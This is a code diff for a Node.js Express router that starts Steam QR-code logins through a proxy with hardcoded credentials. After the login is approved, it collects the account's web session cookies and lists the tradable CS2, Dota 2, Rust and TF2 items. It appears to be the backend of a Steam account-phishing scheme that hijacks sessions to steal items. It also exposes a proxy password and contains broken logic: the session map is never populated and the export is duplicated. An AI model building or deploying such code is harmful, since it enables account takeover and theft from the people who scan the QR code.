@@ -1,52 +1,217 @@
-const WebSocket = require('ws');
+const express = require('express');
+const router = express.Router();
+const SteamUser = require('steam-user')
 const { LoginSession, EAuthTokenPlatformType } = require('steam-session');
-const QRCode = require('qrcode');
+const SteamCommunity = require('steamcommunity');
+const community = new SteamCommunity();
+const QRCode  = require('qrcode');
+const geoip = require('geoip-lite')
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const proxyMiddleware = require('../middlewares/location.js')
+// Store active sessions (for SSE)
+const activeSessions = new Map();
+const client = new SteamUser()
 
-const wss = new WebSocket.Server({ port: 8080 });
 
-wss.on('connection', async function connection(ws) {
+router.use(proxyMiddleware);
+
+
+
+
+
+router.post('/', async (req, res) => {
   try {
-    const session = new LoginSession(EAuthTokenPlatformType.SteamClient);
-    const startResult = await session.startWithQR();
+    const session = new LoginSession(EAuthTokenPlatformType.SteamClient, {
+      httpProxy: "http://themetroo:TmaH3xa2QUzfIniD_country-Argentina:proxy.packetstream.io:31112"
+    });
 
-    // QR კოდის გენერაცია Base64 Data URL
+    const startResult = await session.startWithQR();
     const qrImageUrl = await QRCode.toDataURL(startResult.qrChallengeUrl);
 
-    // პირველივე შეტყობინება - QR კოდი კლიენტს
-    ws.send(JSON.stringify({ type: 'qr', data: qrImageUrl }));
+    res.status(200).json({
+      success: true,
+      message: 'qr generated',
+      qrImageUrl
+    });
+  } catch(error) {
+    console.log('error:', error);
+  }
+});
 
-    // მოვუსმინოთ Steam ლოგინის event-ებს
+
+// SSE Endpoint for real-time updates
+router.get('/events/:sessionId', (req, res) => {
+    const { sessionId } = req.params;
+    const session = activeSessions.get(sessionId);
+
+    if (!session) {
+        return res.status(404).end();
+    }
+
+    // SSE headers
+    res.setHeader('Content-Type', 'text/event-stream');
+    res.setHeader('Cache-Control', 'no-cache');
+    res.setHeader('Connection', 'keep-alive');
+
+    // Event handlers
     session.on('remoteInteraction', () => {
-      ws.send(JSON.stringify({ type: 'scanned', message: 'QR კოდი სკანირებულია, გთხოვთ დაადასტურეთ.' }));
+      res.write(`event: scanned\ndata: ${JSON.stringify({ message: "QR scanned! Waiting for approval..." })}\n\n`);
     });
 
     session.on('authenticated', async () => {
-      ws.send(JSON.stringify({ type: 'authenticated', message: 'მომხმარებელი წარმატებით ავტორიზებულია.' }));
-      // აქ შეგიძლია დაამატო კუკი ან ტოკენების გამოგზავნა
-      const cookies = await session.getWebCookies();
-      ws.send(JSON.stringify({ type: 'cookies', data: cookies }));
-      ws.close();
+        const cookies = await session.getWebCookies();
+        const inventory = await loginWithCookies(cookies)
+        res.write(`event: authenticated\ndata: ${JSON.stringify({ message: "Login successful!", cookies, inventory })}\n\n`);
+        res.end();
+        activeSessions.delete(sessionId); // Cleanup
     });
 
     session.on('timeout', () => {
-      ws.send(JSON.stringify({ type: 'timeout', message: 'სესიამ გაიწურა.' }));
-      ws.close();
+        res.write(`event: timeout\ndata: ${JSON.stringify({ message: "Session timed out." })}\n\n`);
+        res.end();
+        activeSessions.delete(sessionId);
     });
 
     session.on('error', (err) => {
-      ws.send(JSON.stringify({ type: 'error', message: err.message }));
-      ws.close();
+        res.write(`event: error\ndata: ${JSON.stringify({ error: err.message })}\n\n`);
+        res.end();
+        activeSessions.delete(sessionId);
     });
 
-    // თუ კლიენტი გათიშავს კავშირს, ლოგინი გაწყვიტე
-    ws.on('close', () => {
-      if (!session.isAuthenticated) {
-        session.cancelLoginAttempt();
-      }
+    // Handle client disconnect
+    req.on('close', () => {
+        if (session && !session.isAuthenticated) {
+            session.cancelLoginAttempt();
+            activeSessions.delete(sessionId);
+        }
     });
-
-  } catch (error) {
-    ws.send(JSON.stringify({ type: 'error', message: error.message }));
-    ws.close();
-  }
 });
+
+module.exports = router;
+
+
+
+
+
+// Game configurations
+const GAMES = {
+    CS2: { appid: 730, contextid: 2 },
+    DOTA2: { appid: 570, contextid: 2 },
+    RUST: { appid: 252490, contextid: 2 },
+    TF2: { appid: 440, contextid: 2 }
+};
+
+async function loginWithCookies(cookies) {
+    try {
+      // Set cookies and get SteamID
+      community.setCookies(cookies);
+      const steamID =  community.steamID.getSteamID64();
+      
+      // Load all inventories in parallel
+      const inventoryPromises = Object.entries(GAMES).map(async ([gameName, config]) => {
+        try {
+          const inventory = await getInventory(steamID, config.appid, config.contextid);
+          return {
+            game: gameName,
+            items: processInventoryItems(inventory)
+          };
+        } catch (error) {
+            console.error(`Failed to load ${gameName} inventory:`, error);
+            return {
+              game: gameName,
+              items: [],
+              error: error.message
+            };
+        }
+      });
+
+      // Wait for all inventories to load
+      const gameInventories = await Promise.all(inventoryPromises);
+
+      // Convert to object format { CS2: [...], DOTA2: [...], ... }
+      const inventories = {};
+      gameInventories.forEach(result => {
+          inventories[result.game] = result.items;
+      });
+
+      return {
+        steamID,
+        inventories
+      };
+
+    } catch (error) {
+      console.error('Error in loginWithCookies:', error);
+      throw error;
+    }
+}
+
+
+function getInventory(steamID, appid, contextid) {
+  return new Promise((resolve, reject) => {
+    community.getUserInventoryContents(
+      steamID,
+      appid,
+      contextid,
+      true, // tradable only
+      (err, inventory) => {
+        if (err) return reject(err);
+        resolve(inventory);
+      }
+  );
+  });
+}
+
+function processInventoryItems(inventory) {
+  return inventory.map(item => ({
+    assetid: item.assetid,
+    name: item.market_hash_name,
+    icon: item.icon_url,
+    icon_large: item.icon_url_large,
+    tradable: item.tradable,
+    marketable: item.marketable,
+    type: item.type,
+    amount: item.amount
+  }));
+}
+
+
+
+
+
+
+module.exports = router
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// Example usage:
+// const cookies = [...]; // Get these from your authentication flow
+// loginWithCookies(cookies)
+//     .then(data => console.log('Inventory data:', data))
+//     .catch(err => console.error('Failed:', err));
